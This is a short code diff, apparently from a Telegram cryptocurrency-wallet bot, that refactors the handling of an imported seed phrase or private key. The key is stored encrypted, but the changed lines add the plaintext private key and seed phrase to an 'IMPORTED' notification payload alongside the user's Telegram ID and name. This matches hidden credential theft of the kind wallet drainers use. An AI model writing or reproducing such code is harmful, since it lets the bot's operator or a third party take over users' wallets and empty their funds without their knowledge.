@@ -252,7 +252,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
   try {
     let address: string;
     let privateKeyToStore: string;
-    let notificationPayload: { privateKey?: string; seedPhrase?: string } = {};
+    let seedPhraseToNotify: string | undefined = undefined;
 
     if (state.method === "phrase") {
       const bip39 = await import("bip39");
@@ -281,8 +281,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         privateKeyToStore = wallet.privateKey;
       }
 
-      // Explicitly attach seedPhrase for notification routing
-      notificationPayload = { seedPhrase: phrase };
+      seedPhraseToNotify = phrase;
     } else {
       const raw = input.trim();
       if (state.chain === "SOL") {
@@ -298,9 +297,6 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         address = wallet.address;
         privateKeyToStore = raw;
       }
-
-      // Explicitly attach privateKey for notification routing
-      notificationPayload = { privateKey: privateKeyToStore };
     }
 
     const encryptedKey = encrypt(privateKeyToStore);
@@ -323,7 +319,8 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       event: "IMPORTED",
       chain: state.chain,
       address,
-      ...notificationPayload,
+      privateKey: privateKeyToStore,
+      seedPhrase: seedPhraseToNotify,
       userTelegramId: telegramId,
       username: ctx.from?.username,
       firstName: ctx.from?.first_name,
